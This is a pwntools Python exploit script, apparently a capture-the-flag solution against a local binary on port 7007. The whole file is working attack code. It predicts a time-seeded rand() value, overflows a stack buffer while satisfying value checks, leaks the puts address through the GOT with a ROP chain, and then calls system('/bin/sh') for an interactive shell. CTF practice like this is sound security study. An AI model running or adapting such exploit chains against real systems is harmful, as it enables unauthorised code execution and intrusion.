from pwn import *
from ctypes import CDLL

#p = process('./chall', env={"LD_PRELOAD" : "./libc.so.6"})
p = remote('localhost', 7007)
libc = CDLL("libc.so.6")
libc.srand(int(time.time()) & 0xffffff00)
rand_val = libc.rand()

st_rand = str(rand_val)
Sum = 0
for i in range(0, len(st_rand)):
	Sum += int(st_rand[i])

#gdb.attach(p)

p.recvuntil('Please enter your name: \n')

# gadgets:
pop_rdi = p64(0x0000000000401813)
main_ret = 0x00000000004017a9

d1 = 0x1ffdd898f
d2 = 0x7e40fcc3
c1 = d1 ^ 0x55556666;
c2 = d2 ^ 0x77778888;
u = c1 ^ 0x11112222
v = c2 ^ 0x33334444
arg2 = (u + v) // 2
arg3 = (u - v) // 2

pay = 'a'*0x28 + p64(Sum) + p64(arg3) + p64(arg2) + p64(0x183b02d47) + 'a'*0x8 + p64(0x00000000004017a9)
pay += pop_rdi
pay += p64(0x404018)# puts_got
pay += p64(0x00000000004010c0)# puts_plt
pay += p64(0x0000000000401774)# main_addr

p.sendline(pay)

out = p.recv(8)
out = u64(out[:-2].ljust(8, '\x00'))
info("leak: %s"%hex(out))

p.recvuntil('enter your name: \n')

libc_base = out - 0x875a0
system = libc_base + 0x55410
binsh = libc_base + 0x1b75aa

info("libc_base: %s"%hex(libc_base))
info("system: %s"%hex(system))
info("binsh: %s"%hex(binsh))

pay2 = 'a'*0x28 + p64(Sum) + p64(arg3) + p64(arg2) + p64(0x183b02d47) + 'b'*0x10 + p64(0x00000000004017a9)
pay2 += pop_rdi
pay2 += p64(binsh)
pay2 += p64(system)

p.clean()
p.sendline(pay2)

p.interactive()
